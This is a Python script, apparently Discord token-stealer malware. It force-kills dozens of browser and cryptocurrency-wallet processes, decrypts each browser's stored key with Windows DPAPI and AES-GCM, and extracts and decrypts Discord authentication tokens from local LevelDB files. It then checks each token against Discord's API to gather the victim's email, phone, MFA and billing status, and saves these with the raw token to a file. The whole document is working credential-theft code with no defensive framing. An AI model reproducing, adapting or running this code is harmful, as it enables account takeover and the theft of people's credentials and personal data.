_K='uniswap.exe'
_J='trustwallet.exe'
_I='coinomi.exe'
_H='armory.exe'
_G='avant.exe'
_F='k-meleon.exe'
_E='gnome-web.exe'
_D='lunascape.exe'
_C='falkon.exe'
_B='qutebrowser.exe'
_A='brave.exe'
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin,listdir,makedirs,path
from json import loads
from re import findall
import requests,json,os,uuid
from datetime import datetime
import psutil,time
browser_processes=['chrome.exe','msedge.exe','opera.exe',_A,'vivaldi.exe','yandex.exe','slimjet.exe','epic.exe','dragon.exe','centbrowser.exe',_B,_C,'whale.exe','iron.exe','torch.exe','coccoc.exe','polarity.exe','javelin.exe','orbit.exe','chedot.exe',_D,'otter.exe','palemoon.exe','tutanota.exe','duckduckgo.exe','safeguard.exe','xbrowser.exe','medeanalytics.exe','tinfoil.exe','webcat.exe','basilisk.exe','tor.exe','flynx.exe','librewolf.exe','seamonkey.exe','midori.exe',_E,'surf.exe',_B,'qute-browser.exe','otter-browser.exe','pale-moon.exe','arora.exe','qupzilla.exe','kometa.exe',_F,_G,_D,'puffin.exe','sleipnir.exe','epiphany.exe','firefox.exe',_C,'librefox.exe',_E,'webpositive.exe','nexx.exe',_F,_G,'ibrowsr.exe','superbird.exe','rockmelt.exe','hotdog.exe','freedom.exe','flashpeak.exe','slimbrowser.exe','nanoweb.exe','datafox.exe','cyberfox.exe','eset.exe','reborn.exe','charm.exe','fossa.exe','penguin.exe','novel.exe','celtic.exe','polyweb.exe']
wallet_processes=['bitcoin-qt.exe','zcashd.exe',_H,'bytecoin.exe','jaxx.exe','exodus.exe','geth.exe','electrum.exe','atomic.exe','guarda.exe',_I,_J,'dapper.exe','zerion.exe','argent.exe','curve.exe','sushiswap.exe',_K,'1inch.exe','blockchain.exe','mycelium.exe','paxful.exe','celo.exe','nexo.exe',_A,'metamask.exe','bancor.exe','pillar.exe',_J,'kinesis.exe','ripple.exe','ledger-live.exe','trezor.exe',_H,'libra.exe',_K,'coinbase.exe','crypto.exe','zengo.exe','bitpay.exe','bitbns.exe',_I,'blockchain.info.exe','smartbit.exe','bitcoin-cash.exe','stellar.exe','dash.exe','monero.exe','vechain.exe','terra.exe','algorand.exe','tezos.exe','hedera.exe','filecoin.exe','safepal.exe','horizon.exe','bittrex.exe','bitstamp.exe','gate.io.exe','kucoin.exe','okex.exe','pancakeswap.exe']
def kill_processes(process_names,attempts=25,delay=0):
	C='pid';B='name'
	for D in range(attempts):
		print(f"Attempt {D+1} to kill processes...")
		for A in psutil.process_iter([C,B]):
			try:
				if A.info[B].lower()in[A.lower()for A in process_names]:print(f"Killing process: {A.info[B]} (PID: {A.info[C]})");A.terminate()
			except(psutil.NoSuchProcess,psutil.AccessDenied,psutil.ZombieProcess):pass
		time.sleep(delay)
print('Killing browser processes...')
kill_processes(browser_processes)
print('Killing wallet processes...')
kill_processes(wallet_processes)
print('Done.')
tokens=[]
cleaned=[]
checker=[]
def decrypt(buff,master_key):
	A=None
	try:return AES.new(CryptUnprotectData(master_key,A,A,A,0)[1],AES.MODE_GCM,buff[3:15]).decrypt(buff[15:])[:-16].decode()
	except:return'Error'
def get_hw_id():A=uuid.getnode();return A
def get_token():
	V='%Y-%m-%dT%H:%M:%S';U='Discord';Q=[];R=[];A=os.getenv('LOCALAPPDATA');B=os.getenv('APPDATA');W=A+'\\Google\\Chrome\\User Data';X={U:B+'\\discord','Discord Canary':B+'\\discordcanary','Lightcord':B+'\\Lightcord','Discord PTB':B+'\\discordptb','Opera':B+'\\Opera Software\\Opera Stable','Opera GX':B+'\\Opera Software\\Opera GX Stable','Amigo':A+'\\Amigo\\User Data','Torch':A+'\\Torch\\User Data','Kometa':A+'\\Kometa\\User Data','Orbitum':A+'\\Orbitum\\User Data','CentBrowser':A+'\\CentBrowser\\User Data','7Star':A+'\\7Star\\7Star\\User Data','Sputnik':A+'\\Sputnik\\Sputnik\\User Data','Vivaldi':A+'\\Vivaldi\\User Data\\Default','Chrome SxS':A+'\\Google\\Chrome SxS\\User Data','Chrome':W+'Default','Epic Privacy Browser':A+'\\Epic Privacy Browser\\User Data','Microsoft Edge':A+'\\Microsoft\\Edge\\User Data\\Defaul','Uran':A+'\\uCozMedia\\Uran\\User Data\\Default','Yandex':A+'\\Yandex\\YandexBrowser\\User Data\\Default','Brave':A+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Iridium':A+'\\Iridium\\User Data\\Default'}
	for(F,E)in X.items():
		if not os.path.exists(E):print(f"Path does not exist: {E}");continue
		try:
			with open(E+'\\Local State','r')as C:Y=json.loads(C.read())['os_crypt']['encrypted_key']
		except FileNotFoundError:print(f"Local State file not found for {F} at {E}");continue
		except Exception as J:print(f"Failed to retrieve key for {F}: {J}");continue
		G=E+'\\Local Storage\\leveldb\\'
		if not os.path.exists(G):print(f"LevelDB path does not exist: {G}");continue
		for C in listdir(G):
			if not C.endswith('.ldb')and not C.endswith('.log'):continue
			try:
				with open(G+C,'r',errors='ignore')as Z:
					for a in Z.readlines():
						for b in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',a):tokens.append(b)
			except Exception as J:print(f"Error reading tokens from {F} in file {C}: {J}");continue
		for H in tokens:
			if H.endswith('\\'):H.replace('\\','')
			elif H not in cleaned:cleaned.append(H)
		for c in cleaned:
			try:K=decrypt(b64decode(c.split('dQw4w9WgXcQ:')[1]),b64decode(Y)[5:])
			except IndexError=='Error':continue
			R.append(K)
			for S in R:
				if S not in Q:
					Q.append(S);T={'Authorization':K,'Content-Type':'application/json'}
					try:I=requests.get('https://discordapp.com/api/v6/users/@me',headers=T)
					except:continue
					if I.status_code==200:
						D=I.json();d=os.getenv('UserName');e=os.getenv('COMPUTERNAME');f=f"{D['username']}#{D['discriminator']}";g=D['id'];h=D['email'];i=D['phone'];j=D['mfa_enabled'];L=False;I=requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=T);M=I.json();L=bool(len(M)>0);N=0
						if L:k=datetime.strptime(M[0]['current_period_end'].split('.')[0],V);l=datetime.strptime(M[0]['current_period_start'].split('.')[0],V);N=abs((l-k).days)
						m=f"""**{f}** *({g})*

> :dividers: __Account Information__
\tEmail: `{h}`
\tPhone: `{i}`
\t2FA/MFA Enabled: `{j}`
\tNitro: `{L}`
\tExpires in: `{N if N else"None"} day(s)`

> :computer: __PC Information__
\tUsername: `{d}`
\tPC Name: `{e}`
\tPlatform: `{F}`

> :piñata: __Token__
\t`{K}`
""";n=get_hw_id();O=os.path.expanduser(f"~\\Documents\\{n}")
						if not os.path.exists(O):makedirs(O)
						P=os.path.join(O,U)
						if not os.path.exists(P):makedirs(P)
						with open(os.path.join(P,'extracted_data.txt'),'a')as o:o.write(m)
				else:continue
get_token()